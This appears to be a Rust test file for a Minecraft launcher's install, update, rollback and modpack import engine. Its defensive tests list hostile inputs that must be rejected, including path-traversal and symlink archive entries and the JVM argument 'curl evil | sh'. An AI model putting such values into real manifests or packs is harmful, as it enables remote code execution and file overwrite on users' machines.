//! Controlled fixtures exercise the production resolver and transactional engine.
use super::*;
use crate::files::Change;
use serde_json::{Value, json};
use sha2::{Digest, Sha256};
use std::{collections::BTreeMap, io::Write, path::Path, sync::Arc};

async fn engine() -> (tempfile::TempDir, Arc<Engine>) {
	let dir = tempfile::tempdir().unwrap();
	let pool = sqlx::sqlite::SqlitePoolOptions::new()
		.max_connections(1)
		.connect("sqlite::memory:")
		.await
		.unwrap();
	let e = Engine::open(dir.path().into(), pool).await.unwrap();
	(dir, e)
}
fn create(name: &str, loader: Loader) -> CreateInstance {
	CreateInstance {
		name: name.into(),
		game_version: "1.20.1".into(),
		loader,
		loader_version: (loader != Loader::Vanilla).then(|| "0.16.0".into()),
		memory_mb: 2048,
		java_path: None,
	}
}
fn fixture(e: &Engine, url: &str, value: &Value) {
	e.downloads.fixture(url, serde_json::to_vec(value).unwrap());
}
fn manifest(version: &str, files: &[(&str, &[u8])]) -> Value {
	json!({"schemaVersion":1,"id":"standard","version":version,"minecraft":"1.20.1","loader":{"kind":"vanilla","version":null},"files":files.iter().map(|(path,data)|json!({"path":path,"url":format!("https://cdn.modrinth.com/{version}/{path}"),"sha256":hex::encode(Sha256::digest(data)),"size":data.len(),"required":true,"updatePolicy":"managed_only"})).collect::<Vec<_>>(),"java":{"major":17},"memory":{"minimumMb":512,"recommendedMb":2048,"maximumMb":4096},"releaseChannel":"stable","servers":[],"launch":{}})
}
fn install_manifest(e: &Engine, m: &Value, files: &[(&str, &[u8])]) {
	fixture(
		e,
		"https://raw.githubusercontent.com/ncreate/standard.json",
		m,
	);
	for (path, data) in files {
		e.downloads.fixture(
			&format!(
				"https://cdn.modrinth.com/{}/{path}",
				m["version"].as_str().unwrap()
			),
			data.to_vec(),
		);
	}
}
async fn configure(e: &Engine) {
	e.configure_manifest_providers(ManifestProviders {
		stable: BTreeMap::from([(
			"standard".into(),
			"https://raw.githubusercontent.com/ncreate/standard.json".into(),
		)]),
		beta: BTreeMap::new(),
	})
	.await
	.unwrap();
}
fn version(id: &str, project: &str, payload: &[u8], deps: Vec<Value>) -> Value {
	json!({"id":id,"project_id":project,"name":format!("{project} {id}"),"version_number":id,"date_published":if id.ends_with('2'){"2026-02-01T00:00:00Z"}else{"2026-01-01T00:00:00Z"},"version_type":"release","game_versions":["1.20.1"],"loaders":["fabric"],"dependencies":deps,"files":[{"filename":format!("{project}-{id}.jar"),"primary":true,"size":payload.len(),"url":format!("https://cdn.modrinth.com/{id}.jar"),"hashes":{"sha512":crate::download::hash(payload)}}]})
}
fn install_version(e: &Engine, v: &Value, payload: &[u8]) {
	let id = v["id"].as_str().unwrap();
	fixture(e, &format!("https://api.modrinth.com/v2/version/{id}"), v);
	e.downloads.fixture(
		&format!("https://cdn.modrinth.com/{id}.jar"),
		payload.into(),
	);
}

#[tokio::test]
async fn official_install_diff_update_restart_rollback_preserves_users() {
	let (dir, e) = engine().await;
	configure(&e).await;
	let v1 = manifest(
		"1.0.0",
		&[("mods/a.jar", b"one"), ("config/removed.json", b"old")],
	);
	install_manifest(
		&e,
		&v1,
		&[("mods/a.jar", b"one"), ("config/removed.json", b"old")],
	);
	let op = e.begin("install", None);
	let i = e.install_edition("standard", "stable", &op).await.unwrap();
	let root = Path::new(&i.directory);
	for (path, data) in [
		("saves/world/level.dat", b"world".as_slice()),
		("options.txt", b"settings"),
		("config/user.json", b"user"),
		("mods/custom.jar", b"custom"),
	] {
		let target = root.join(path);
		tokio::fs::create_dir_all(target.parent().unwrap())
			.await
			.unwrap();
		tokio::fs::write(target, data).await.unwrap();
	}
	let v2 = manifest(
		"2.0.0",
		&[("mods/a.jar", b"two"), ("config/new.json", b"new")],
	);
	install_manifest(
		&e,
		&v2,
		&[("mods/a.jar", b"two"), ("config/new.json", b"new")],
	);
	let plan = e.check_edition_update(&i.id, "stable").await.unwrap();
	assert_eq!(plan.added, vec!["config/new.json"]);
	assert_eq!(plan.changed, vec!["mods/a.jar"]);
	assert_eq!(plan.removed, vec!["config/removed.json"]);
	assert_eq!(plan.download_bytes, 6);
	assert_eq!(
		e.downloads
			.fixture_count("https://cdn.modrinth.com/1.0.0/mods/a.jar"),
		1
	);
	assert!(plan.conflicts.is_empty());
	let op = e.begin("update", Some(&i.id));
	e.apply_edition_update(&i.id, "stable", &op).await.unwrap();
	assert_eq!(
		tokio::fs::read(root.join("mods/a.jar")).await.unwrap(),
		b"two"
	);
	assert!(!root.join("config/removed.json").exists());
	let restarted = Engine::open(dir.path().into(), e.pool.clone())
		.await
		.unwrap();
	assert_eq!(
		restarted
			.instance(&i.id)
			.await
			.unwrap()
			.manifest_version
			.as_deref(),
		Some("2.0.0")
	);
	restarted.rollback(&i.id).await.unwrap();
	assert_eq!(
		tokio::fs::read(root.join("mods/a.jar")).await.unwrap(),
		b"one"
	);
	assert_eq!(
		tokio::fs::read(root.join("config/removed.json"))
			.await
			.unwrap(),
		b"old"
	);
	assert!(!root.join("config/new.json").exists());
	for path in [
		"saves/world/level.dat",
		"options.txt",
		"config/user.json",
		"mods/custom.jar",
	] {
		assert!(root.join(path).exists());
	}
	assert_eq!(
		restarted
			.instance(&i.id)
			.await
			.unwrap()
			.manifest_version
			.as_deref(),
		Some("1.0.0")
	);
}
#[tokio::test]
async fn hash_failure_and_modified_user_files_do_not_apply_update() {
	let (_dir, e) = engine().await;
	configure(&e).await;
	let v1 = manifest("1", &[("mods/a.jar", b"one")]);
	install_manifest(&e, &v1, &[("mods/a.jar", b"one")]);
	let i = e
		.install_edition("standard", "stable", &e.begin("install", None))
		.await
		.unwrap();
	let v2 = manifest("2", &[("mods/a.jar", b"two")]);
	install_manifest(&e, &v2, &[("mods/a.jar", b"wrong")]);
	assert!(
		e.apply_edition_update(&i.id, "stable", &e.begin("update", None))
			.await
			.is_err()
	);
	assert_eq!(
		tokio::fs::read(Path::new(&i.directory).join("mods/a.jar"))
			.await
			.unwrap(),
		b"one"
	);
	assert_eq!(
		e.instance(&i.id).await.unwrap().manifest_version.as_deref(),
		Some("1")
	);
	tokio::fs::write(Path::new(&i.directory).join("mods/a.jar"), b"user edit")
		.await
		.unwrap();
	let plan = e.check_edition_update(&i.id, "stable").await.unwrap();
	assert_eq!(plan.conflicts, vec!["mods/a.jar"]);
	assert!(
		e.apply_edition_update(&i.id, "stable", &e.begin("update", None))
			.await
			.is_err()
	);
	assert_eq!(
		tokio::fs::read(Path::new(&i.directory).join("mods/a.jar"))
			.await
			.unwrap(),
		b"user edit"
	);
}
#[tokio::test]
async fn interrupted_apply_recovers_and_metadata_failure_rolls_back_immediately() {
	let (dir, e) = engine().await;
	let i = e
		.create_instance(create("Recovery", Loader::Vanilla))
		.await
		.unwrap();
	let root = Path::new(&i.directory);
	tokio::fs::write(root.join("a.txt"), b"old").await.unwrap();
	let mut tx = e
		.prepare_transaction(
			&i.id,
			vec![Change {
				path: "a.txt".into(),
				before_hash: Some(crate::download::hash(b"old")),
				after_hash: Some(crate::download::hash(b"new")),
			}],
		)
		.await
		.unwrap();
	tokio::fs::write(tx.directory.join("stage/a.txt"), b"new")
		.await
		.unwrap();
	e.apply_files(&mut tx, &e.begin("update", None))
		.await
		.unwrap();
	assert_eq!(tokio::fs::read(root.join("a.txt")).await.unwrap(), b"new");
	let restarted = Engine::open(dir.path().into(), e.pool.clone())
		.await
		.unwrap();
	assert_eq!(tokio::fs::read(root.join("a.txt")).await.unwrap(), b"old");
	let mut tx = restarted
		.prepare_transaction(
			&i.id,
			vec![Change {
				path: "a.txt".into(),
				before_hash: Some(crate::download::hash(b"old")),
				after_hash: Some(crate::download::hash(b"new")),
			}],
		)
		.await
		.unwrap();
	tokio::fs::write(tx.directory.join("stage/a.txt"), b"new")
		.await
		.unwrap();
	restarted
		.apply_files(&mut tx, &restarted.begin("update", None))
		.await
		.unwrap();
	assert!(
		restarted
			.complete_transaction(&mut tx, async {
				Err(Error::Invalid("simulated metadata error".into()))
			})
			.await
			.is_err()
	);
	assert_eq!(tokio::fs::read(root.join("a.txt")).await.unwrap(), b"old");
}
#[tokio::test]
async fn content_dependency_install_toggle_update_and_rollback() {
	let (_dir, e) = engine().await;
	let i = e
		.create_instance(create("Mods", Loader::Fabric))
		.await
		.unwrap();
	let dep = version("dep1", "dependency", b"dep", vec![]);
	let first = version(
		"main1",
		"main",
		b"first",
		vec![
			json!({"version_id":"dep1","project_id":"dependency","file_name":null,"dependency_type":"required"}),
		],
	);
	install_version(&e, &dep, b"dep");
	install_version(&e, &first, b"first");
	fixture(
		&e,
		"https://api.modrinth.com/v2/project/main/version",
		&json!([first]),
	);
	let installed = e
		.install_content(
			ContentInstall {
				instance_id: i.id.clone(),
				project_id: "main".into(),
				version_id: Some("main1".into()),
				kind: "mod".into(),
			},
			&e.begin("install", Some(&i.id)),
		)
		.await
		.unwrap();
	assert_eq!(installed.len(), 2);
	let primary = installed
		.iter()
		.find(|c| c.project_id.as_deref() == Some("main"))
		.unwrap();
	e.toggle_content(&primary.id, false).await.unwrap();
	assert!(
		Path::new(&i.directory)
			.join("mods/main-main1.jar.disabled")
			.exists()
	);
	e.toggle_content(&primary.id, true).await.unwrap();
	let dep2 = version("dep2", "dependency", b"new dep", vec![]);
	install_version(&e, &dep2, b"new dep");
	let second = version(
		"main2",
		"main",
		b"second",
		vec![
			json!({"version_id":"dep2","project_id":"dependency","file_name":null,"dependency_type":"required"}),
		],
	);
	install_version(&e, &second, b"second");
	fixture(
		&e,
		"https://api.modrinth.com/v2/project/main/version?game_versions=%5B%221.20.1%22%5D&loaders=%5B%22fabric%22%5D",
		&json!([second]),
	);
	fixture(
		&e,
		"https://api.modrinth.com/v2/project/dependency/version?game_versions=%5B%221.20.1%22%5D&loaders=%5B%22fabric%22%5D",
		&json!([dep]),
	);
	let updates = e.check_content_updates(&i.id).await.unwrap();
	assert_eq!(updates.len(), 1);
	e.update_content(&i.id, &[], &e.begin("update", None))
		.await
		.unwrap();
	assert!(Path::new(&i.directory).join("mods/main-main2.jar").exists());
	assert!(
		Path::new(&i.directory)
			.join("mods/dependency-dep2.jar")
			.exists()
	);
	assert!(
		!Path::new(&i.directory)
			.join("mods/dependency-dep1.jar")
			.exists()
	);
	assert!(!Path::new(&i.directory).join("mods/main-main1.jar").exists());
	e.rollback(&i.id).await.unwrap();
	assert!(Path::new(&i.directory).join("mods/main-main1.jar").exists());
	assert!(!Path::new(&i.directory).join("mods/main-main2.jar").exists());
	assert!(
		Path::new(&i.directory)
			.join("mods/dependency-dep1.jar")
			.exists()
	);
	e.remove_content(&primary.id).await.unwrap();
	assert_eq!(e.content(&i.id).await.unwrap().len(), 1);
}
fn pack(path: &Path, index: Value, entries: &[(&str, &[u8])]) {
	let mut writer = zip::ZipWriter::new(std::fs::File::create(path).unwrap());
	let opts = zip::write::SimpleFileOptions::default();
	writer.start_file("modrinth.index.json", opts).unwrap();
	writer
		.write_all(&serde_json::to_vec(&index).unwrap())
		.unwrap();
	for (name, data) in entries {
		writer.start_file(*name, opts).unwrap();
		writer.write_all(data).unwrap();
	}
	writer.finish().unwrap();
}
fn index() -> Value {
	json!({"formatVersion":1,"game":"minecraft","versionId":"1","name":"Fixture","files":[],"dependencies":{"minecraft":"1.20.1"}})
}
#[tokio::test]
async fn mrpack_import_export_duplicate_and_reject_traversal() {
	let (dir, e) = engine().await;
	let path = dir.path().join("fixture.mrpack");
	pack(
		&path,
		index(),
		&[
			("overrides/config/test.json", b"config"),
			("overrides/mods/a.jar", b"jar"),
		],
	);
	let i = e
		.import_pack(&path, "Imported", &e.begin("import", None))
		.await
		.unwrap();
	assert_eq!(e.content(&i.id).await.unwrap().len(), 2);
	let export = dir.path().join("export.mrpack");
	e.export_pack(&i.id, &export).await.unwrap();
	let copy = e
		.import_pack(&export, "Exported", &e.begin("import", None))
		.await
		.unwrap();
	assert_eq!(
		tokio::fs::read(Path::new(&copy.directory).join("config/test.json"))
			.await
			.unwrap(),
		b"config"
	);
	let duplicate = e.duplicate_instance(&i.id, "Duplicated").await.unwrap();
	assert_ne!(duplicate.id, i.id);
	assert_eq!(e.content(&duplicate.id).await.unwrap().len(), 2);
	let evil = dir.path().join("evil.mrpack");
	pack(&evil, index(), &[("overrides/../../escape", b"attack")]);
	assert!(
		e.import_pack(&evil, "Evil", &e.begin("import", None))
			.await
			.is_err()
	);
	assert!(!dir.path().join("escape").exists());
	e.delete_instance(&copy.id).await.unwrap();
	assert!(e.instance(&copy.id).await.is_err());
}
#[tokio::test]
async fn mrpack_rejects_hash_mismatch_unknown_origin_malformed_and_oversize() {
	let (dir, e) = engine().await;
	let path = dir.path().join("bad.mrpack");
	let mut bad = index();
	bad["files"] = json!([{"path":"mods/a.jar","hashes":{"sha512":"a".repeat(128)},"downloads":["https://cdn.modrinth.com/bad.jar"],"fileSize":3}]);
	e.downloads
		.fixture("https://cdn.modrinth.com/bad.jar", b"bad".to_vec());
	pack(&path, bad.clone(), &[]);
	assert!(
		e.import_pack(&path, "Bad hash", &e.begin("import", None))
			.await
			.is_err()
	);
	bad["files"][0]["downloads"] = json!(["https://unknown.example/a.jar"]);
	pack(&path, bad.clone(), &[]);
	assert!(
		e.import_pack(&path, "Unknown source", &e.begin("import", None))
			.await
			.is_err()
	);
	bad["files"][0]["downloads"] = json!(["https://cdn.modrinth.com/a.jar"]);
	bad["files"][0]["fileSize"] = json!(2147483649u64);
	pack(&path, bad, &[]);
	assert!(
		e.import_pack(&path, "Oversized", &e.begin("import", None))
			.await
			.is_err()
	);
	pack(&path, json!({"formatVersion":3}), &[]);
	assert!(
		e.import_pack(&path, "Malformed", &e.begin("import", None))
			.await
			.is_err()
	);
}
#[tokio::test]
async fn migration_preserves_existing_v1_accounts_and_settings() {
	let dir = tempfile::tempdir().unwrap();
	let pool = sqlx::sqlite::SqlitePoolOptions::new()
		.max_connections(1)
		.connect("sqlite::memory:")
		.await
		.unwrap();
	for statement in [
		"CREATE TABLE accounts(uuid TEXT PRIMARY KEY,nickname TEXT)",
		"CREATE TABLE settings(key TEXT PRIMARY KEY,value TEXT)",
		"INSERT INTO accounts VALUES('uuid','Player')",
		"INSERT INTO settings VALUES('memory','2048')",
		"PRAGMA user_version=1",
	] {
		sqlx::query(statement).execute(&pool).await.unwrap();
	}
	let e = Engine::open(dir.path().into(), pool).await.unwrap();
	assert_eq!(
		sqlx::query_scalar::<_, String>("SELECT nickname FROM accounts")
			.fetch_one(&e.pool)
			.await
			.unwrap(),
		"Player"
	);
	assert_eq!(
		sqlx::query_scalar::<_, String>("SELECT value FROM settings")
			.fetch_one(&e.pool)
			.await
			.unwrap(),
		"2048"
	);
	assert_eq!(
		sqlx::query_scalar::<_, i64>("PRAGMA user_version")
			.fetch_one(&e.pool)
			.await
			.unwrap(),
		3
	);
}
#[tokio::test]
async fn download_fixture_limits_cache_hash_and_cancellation() {
	let (dir, e) = engine().await;
	e.downloads
		.fixture("https://cdn.modrinth.com/x", b"bytes".to_vec());
	let op = e.begin("download", None);
	assert!(
		e.downloads
			.bytes("https://cdn.modrinth.com/x", 4, &op)
			.await
			.is_err()
	);
	let path = dir.path().join("x");
	assert!(
		e.downloads
			.file("https://cdn.modrinth.com/x", &path, "00", "sha256", 5, &op)
			.await
			.is_err()
	);
	assert!(!path.exists());
	e.downloads
		.file(
			"https://cdn.modrinth.com/x",
			&path,
			&hex::encode(Sha256::digest(b"bytes")),
			"sha256",
			5,
			&op,
		)
		.await
		.unwrap();
	e.cancel(&op.id()).unwrap();
	assert!(matches!(
		e.downloads
			.bytes("https://cdn.modrinth.com/x", 10, &op)
			.await,
		Err(Error::Cancelled)
	));
}

#[tokio::test]
async fn public_search_and_compatible_version_fixture() {
	let (_dir, e) = engine().await;
	let mut url = reqwest::Url::parse("https://api.modrinth.com/v2/search").unwrap();
	url.query_pairs_mut().append_pair("query","sodium").append_pair("facets",r#"[["project_type:mod"],["versions:1.20.1"],["categories:fabric"],["categories:optimization"]]"#).append_pair("index","downloads").append_pair("offset","20").append_pair("limit","20");
	fixture(
		&e,
		url.as_str(),
		&json!({"hits":[{"project_id":"main","title":"Fixture"}],"offset":20,"total_hits":21}),
	);
	let results=e.search(serde_json::from_value(json!({"query":"sodium","kind":"mod","game_version":"1.20.1","loader":"fabric","category":"optimization","sort":"downloads","offset":20})).unwrap()).await.unwrap();
	assert_eq!(results.total_hits, 21);
	assert_eq!(results.hits[0]["title"], "Fixture");
	let v = version("main1", "main", b"jar", vec![]);
	fixture(
		&e,
		"https://api.modrinth.com/v2/project/main/version?game_versions=%5B%221.20.1%22%5D&loaders=%5B%22fabric%22%5D",
		&json!([v]),
	);
	let versions = e
		.versions("main", Some("1.20.1"), Some("fabric"))
		.await
		.unwrap();
	assert!(crate::content::compatible(
		&versions[0],
		"1.20.1",
		Loader::Fabric,
		"mod"
	));
	assert!(!crate::content::compatible(
		&versions[0],
		"1.20.1",
		Loader::Forge,
		"mod"
	));
}
#[tokio::test]
async fn preserved_manifest_file_becomes_unmanaged_and_server_preferences_survive() {
	let (_dir, e) = engine().await;
	configure(&e).await;
	let mut v1 = manifest("1", &[("config/preferences.json", b"default")]);
	v1["files"][0]["updatePolicy"] = json!("preserve");
	v1["servers"] = json!([{"name":"NCreate","address":"play.example.com:25565"}]);
	install_manifest(&e, &v1, &[("config/preferences.json", b"default")]);
	let i = e
		.install_edition("standard", "stable", &e.begin("install", None))
		.await
		.unwrap();
	let root = Path::new(&i.directory);
	let servers = tokio::fs::read(root.join("servers.dat")).await.unwrap();
	assert_eq!(&servers[..3], &[10, 0, 0]);
	assert!(servers.windows(16).any(|s| s == b"play.example.com"));
	tokio::fs::write(root.join("servers.dat"), b"player server preferences")
		.await
		.unwrap();
	tokio::fs::write(root.join("config/preferences.json"), b"user preference")
		.await
		.unwrap();
	let mut v2 = manifest("2", &[]);
	v2["servers"] = json!([{"name":"Updated","address":"new.example.com"}]);
	install_manifest(&e, &v2, &[]);
	let plan = e.check_edition_update(&i.id, "stable").await.unwrap();
	assert!(plan.removed.is_empty());
	assert!(plan.conflicts.is_empty());
	e.apply_edition_update(&i.id, "stable", &e.begin("update", None))
		.await
		.unwrap();
	assert_eq!(
		tokio::fs::read(root.join("config/preferences.json"))
			.await
			.unwrap(),
		b"user preference"
	);
	assert_eq!(
		tokio::fs::read(root.join("servers.dat")).await.unwrap(),
		b"player server preferences"
	);
	assert!(!e.content(&i.id).await.unwrap()[0].managed);
}
#[tokio::test]
async fn mrpack_symlink_and_absolute_path_rejected() {
	let (dir, e) = engine().await;
	let path = dir.path().join("symlink.mrpack");
	let mut writer = zip::ZipWriter::new(std::fs::File::create(&path).unwrap());
	let opts = zip::write::SimpleFileOptions::default();
	writer.start_file("modrinth.index.json", opts).unwrap();
	writer
		.write_all(&serde_json::to_vec(&index()).unwrap())
		.unwrap();
	writer.add_symlink("overrides/link", "/tmp", opts).unwrap();
	writer.finish().unwrap();
	assert!(
		e.import_pack(&path, "Symlink", &e.begin("import", None))
			.await
			.is_err()
	);
	pack(&path, index(), &[("/absolute", b"payload")]);
	assert!(
		e.import_pack(&path, "Absolute", &e.begin("import", None))
			.await
			.is_err()
	);
}
#[test]
fn remote_manifest_rejects_java_agent_shell_hooks_and_missing_loader() {
	for argument in [
		"-javaagent:evil.jar",
		"-XX:OnError=curl evil | sh",
		"-XX:OnOutOfMemoryError=command",
		"-cp",
		"@args.txt",
	] {
		let mut value = manifest("1", &[]);
		value["launch"] = json!({"jvmArgs":[argument]});
		let parsed: EditionManifest = serde_json::from_value(value).unwrap();
		assert!(
			crate::editions::validate_manifest(&parsed, "standard", "stable").is_err(),
			"{argument}"
		);
	}
	let mut value = manifest("1", &[]);
	value["loader"] = json!({"kind":"fabric","version":null});
	assert!(
		crate::editions::validate_manifest(
			&serde_json::from_value(value).unwrap(),
			"standard",
			"stable"
		)
		.is_err()
	);
}

#[tokio::test]
async fn mod_channels_require_explicit_beta_and_update_remains_compatible() {
	let (_dir, e) = engine().await;
	let i = e
		.create_instance(create("Channels", Loader::Fabric))
		.await
		.unwrap();
	let stable = version("main1", "main", b"stable", vec![]);
	let mut beta = version("main2", "main", b"beta", vec![]);
	beta["version_type"] = json!("beta");
	install_version(&e, &stable, b"stable");
	install_version(&e, &beta, b"beta");
	fixture(
		&e,
		"https://api.modrinth.com/v2/project/main/version",
		&json!([beta, stable]),
	);
	let request = ContentInstall {
		instance_id: i.id.clone(),
		project_id: "main".into(),
		version_id: None,
		kind: "mod".into(),
	};
	e.install_content(request.clone(), &e.begin("install", None))
		.await
		.unwrap();
	assert_eq!(
		e.content(&i.id).await.unwrap()[0].version_id.as_deref(),
		Some("main1")
	);
	fixture(
		&e,
		"https://api.modrinth.com/v2/project/main/version?game_versions=%5B%221.20.1%22%5D&loaders=%5B%22fabric%22%5D",
		&json!([beta, stable]),
	);
	assert!(e.check_content_updates(&i.id).await.unwrap().is_empty());
	assert_eq!(
		e.check_content_updates_for_channel(&i.id, "beta")
			.await
			.unwrap()[0]
			.next_version,
		"main2"
	);
	let mut explicit = request.clone();
	explicit.version_id = Some("main2".into());
	assert!(
		e.install_content(explicit.clone(), &e.begin("install", None))
			.await
			.is_err()
	);
	e.update_content_for_channel(&i.id, &[], "beta", &e.begin("update", None))
		.await
		.unwrap();
	assert_eq!(
		e.content(&i.id).await.unwrap()[0].version_id.as_deref(),
		Some("main2")
	);
	assert!(
		e.check_content_updates_for_channel(&i.id, "dev")
			.await
			.is_err()
	);
}

#[tokio::test]
async fn streamed_pack_overrides_are_case_safe_and_client_specific() {
	let (dir, e) = engine().await;
	let path = dir.path().join("overrides.mrpack");
	pack(
		&path,
		index(),
		&[
			("client-overrides/config/test.json", b"client"),
			("overrides/config/test.json", b"common"),
		],
	);
	let i = e
		.import_pack(&path, "Overrides", &e.begin("import", None))
		.await
		.unwrap();
	assert_eq!(
		tokio::fs::read(Path::new(&i.directory).join("config/test.json"))
			.await
			.unwrap(),
		b"client"
	);
	pack(
		&path,
		index(),
		&[
			("overrides/mods/A.jar", b"a"),
			("overrides/mods/a.jar", b"b"),
		],
	);
	assert!(
		e.import_pack(&path, "Unsafe Windows collision", &e.begin("import", None))
			.await
			.is_err()
	);
	let op = e.begin("import", None);
	let future = e.import_pack(&path, "Size probe", &op);
	fn assert_send<T: Send>(_: &T) {}
	assert_send(&future);
	let size = std::mem::size_of_val(&future);
	assert!(
		size < 256 * 1024,
		"import future is too large for portable executor stacks: {size}"
	);
}

#[tokio::test]
async fn imported_mod_hash_identification_is_verified_compatible_and_graceful_for_unknown_files() {
	let (dir, e) = engine().await;
	let path = dir.path().join("identify.mrpack");
	let mut pack_index = index();
	pack_index["dependencies"]["fabric-loader"] = json!("0.16.0");
	pack(
		&path,
		pack_index,
		&[
			("overrides/mods/known.jar", b"known"),
			("overrides/mods/unknown.jar", b"unknown"),
			("overrides/mods/forge.jar", b"forge"),
		],
	);
	let i = e
		.import_pack(&path, "Identify", &e.begin("import", None))
		.await
		.unwrap();
	let known = version("main1", "main", b"known", vec![]);
	let next = version("main2", "main", b"updated", vec![]);
	let mut forge = version("forge1", "forge", b"forge", vec![]);
	forge["loaders"] = json!(["forge"]);
	let mut response = serde_json::Map::new();
	response.insert(crate::download::hash(b"known"), known);
	response.insert(crate::download::hash(b"forge"), forge);
	fixture(
		&e,
		"POST https://api.modrinth.com/v2/version_files",
		&Value::Object(response),
	);
	fixture(
		&e,
		"https://api.modrinth.com/v2/project/main/version?game_versions=%5B%221.20.1%22%5D&loaders=%5B%22fabric%22%5D",
		&json!([next]),
	);
	let updates = e.check_content_updates(&i.id).await.unwrap();
	assert_eq!(updates.len(), 1);
	assert_eq!(updates[0].next_version, "main2");
	assert_eq!(
		e.downloads
			.fixture_count("POST https://api.modrinth.com/v2/version_files"),
		1
	);
	let installed = e.content(&i.id).await.unwrap();
	let identified = installed
		.iter()
		.find(|x| x.path == "mods/known.jar")
		.unwrap();
	assert_eq!(identified.project_id.as_deref(), Some("main"));
	assert_eq!(identified.version_id.as_deref(), Some("main1"));
	assert_eq!(identified.version_number.as_deref(), Some("main1"));
	for item in installed.iter().filter(|x| x.path != "mods/known.jar") {
		assert!(item.project_id.is_none());
		assert!(item.version_number.is_none());
	}
	assert_eq!(
		tokio::fs::read(Path::new(&i.directory).join("mods/known.jar"))
			.await
			.unwrap(),
		b"known"
	);
}
